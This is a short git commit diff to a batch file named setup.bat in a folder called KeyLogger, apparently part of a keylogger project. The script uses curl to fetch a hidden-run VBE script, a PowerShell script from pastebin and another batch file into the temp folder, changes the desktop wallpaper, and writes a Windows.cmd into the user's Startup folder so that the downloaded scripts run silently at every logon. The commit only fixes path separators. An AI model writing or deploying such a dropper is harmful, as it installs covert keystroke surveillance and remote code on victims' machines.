b1305daf7160dae94468e4bbe1463cfd5ccdcde8
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-11-07 12:59:37 +0100

    Update setup.bat

--- KeyLogger/setup.bat
+++ KeyLogger/setup.bat
@@ -12,9 +12,9 @@ curl -s https://everythingisviral.com/wp-content/uploads/2021/01/gigachad-meme.p
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
 curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%/t/background.png /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%\t\background.png /f
 
-cd "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup"
+cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo @echo off>Windows.cmd
 echo cd %temp%/t>>Windows.cmd
 echo wscript.exe "i.vbe" "r.bat">>Windows.cmd
